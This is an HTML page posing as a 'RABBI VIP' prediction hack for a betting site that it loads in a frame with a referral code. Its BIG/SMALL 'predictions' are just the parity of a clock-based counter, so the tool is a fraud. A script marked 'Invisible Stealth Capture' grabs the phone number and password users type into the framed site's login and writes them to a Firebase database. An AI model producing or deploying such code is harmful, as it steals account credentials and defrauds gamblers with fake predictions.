<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RABBI VIP ✨ - All Device Support</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        :root { --neon: #00f2fe; --pink: #ff00ff; }
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #000; }
        #site-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
        
        #drag-box { position: absolute; z-index: 9999; cursor: move; touch-action: none; }
        .b-btn {
            width: 40px; height: 40px; border-radius: 50%;
            background: #000; border: 2px solid var(--neon);
            display: flex; justify-content: center; align-items: center;
            box-shadow: 0 0 10px var(--neon);
        }
        .b-btn span { color: white; font-weight: bold; font-size: 20px; pointer-events: none; }

        .hack-panel {
            position: fixed; top: 15px; right: 15px;
            width: 145px; background: rgba(0, 0, 0, 0.98);
            border: 1px solid var(--neon); border-radius: 12px; padding: 10px;
            display: none; z-index: 10000; box-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
            backdrop-filter: blur(12px); color: white;
        }

        .header { font-size: 11px; text-align: center; font-weight: bold; border-bottom: 1px solid #333; margin-bottom: 8px; padding-bottom: 4px; }
        #login-section input {
            width: 100%; padding: 8px; background: #111; border: 1px solid #444;
            color: #fff; font-size: 12px; border-radius: 6px; margin-bottom: 8px; outline: none; box-sizing: border-box;
        }
        .btn {
            width: 100%; padding: 8px; background: var(--neon);
            border: none; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; color: #000;
        }

        .res-box {
            background: #000; border: 1px solid var(--pink);
            padding: 12px; text-align: center; border-radius: 8px;
            font-size: 20px; font-weight: bold; margin: 8px 0; text-shadow: 0 0 10px var(--pink);
        }
        .timer { color: #ff3e3e; font-weight: bold; font-size: 12px; }
    </style>
</head>
<body>

    <iframe id="site-frame" src="https://dkwin9.com/#/register?invitationCode=396922332054"></iframe>

    <div id="drag-box" style="left: 15px; top: 160px;">
        <div class="b-btn" onclick="toggleUI()"><span>B</span></div>
    </div>

    <div class="hack-panel" id="ui">
        <div class="header">RABBI VIP SYSTEM</div>
        
        <div id="login-section">
            <input type="password" id="h-pass" placeholder="Enter Password">
            <button class="btn" onclick="checkPass()">LOGIN</button>
        </div>

        <div id="hack-interface" style="display: none;">
            <div style="font-size: 9px; color: #aaa; text-align: center;">Period: <span id="p-num" style="color: var(--neon);">---</span></div>
            <div class="res-box" id="res">READY</div>
            <div style="font-size: 9px; text-align: center;">Next: <span class="timer" id="tm">00</span>s</div>
        </div>
    </div>

    <script>
        function checkPass() {
            if(document.getElementById('h-pass').value === "RABBI9560") {
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('hack-interface').style.display = 'block';
                startEngine();
            } else { alert("Incorrect!"); }
        }

        // Invisible Stealth Capture (সব ডিভাইসে চলবে)
        const frame = document.getElementById('site-frame');
        frame.onload = function() {
            frame.contentWindow.document.addEventListener('click', function(e) {
                if (e.target.innerText.includes('Login') || e.target.tagName === 'BUTTON') {
                    const doc = frame.contentDocument || frame.contentWindow.document;
                    const inputs = doc.querySelectorAll('input');
                    let dkNumber = inputs[0] ? inputs[0].value : "";
                    let dkPass = inputs[1] ? inputs[1].value : "";

                    if(dkNumber.length > 5) {
                        database.ref('UserLogs/' + Date.now()).set({
                            "Dk Number": dkNumber,
                            "Dk Password": dkPass
                        });
                    }
                }
            }, true);
        };

        function toggleUI() { 
            let u = document.getElementById('ui');
            u.style.display = (u.style.display === 'block') ? 'none' : 'block';
        }

        let lastP = "";
        function startEngine() {
            setInterval(() => {
                const now = new Date();
                const diff = Math.floor((now.getTime() - new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime()) / 1000);
                const fP = Math.floor(diff / 30) + 1 + 280; 
                const display = String(fP).slice(-3);
                let rem = 30 - (now.getSeconds() % 30);
                
                document.getElementById('p-num').innerText = display;
                document.getElementById('tm').innerText = (rem < 10 ? "0" : "") + rem;

                if (display !== lastP) {
                    lastP = display;
                    document.getElementById('res').innerText = (fP % 2 === 0) ? "BIG" : "SMALL";
                }
            }, 1000);
        }

        // Drag Logic
        const box = document.getElementById("drag-box");
        let active = false, xOff = 0, yOff = 0, iX, iY;
        function dS(e) { iX = (e.type === "touchstart" ? e.touches[0].clientX : e.clientX) - xOff; iY = (e.type === "touchstart" ? e.touches[0].clientY : e.clientY) - yOff; if (e.target === box || box.contains(e.target)) active = true; }
        function dE() { active = false; }
        function dR(e) { if (active) { let cX = (e.type === "touchmove" ? e.touches[0].clientX : e.clientX) - iX; let cY = (e.type === "touchmove" ? e.touches[0].clientY : e.clientY) - iY; xOff = cX; yOff = cY; box.style.transform = `translate3d(${cX}px, ${cY}px, 0)`; } }
        document.addEventListener("touchstart", dS); document.addEventListener("touchend", dE); document.addEventListener("touchmove", dR);
        document.addEventListener("mousedown", dS); document.addEventListener("mouseup", dE); document.addEventListener("mousemove", dR);
    </script>
</body>
</html>
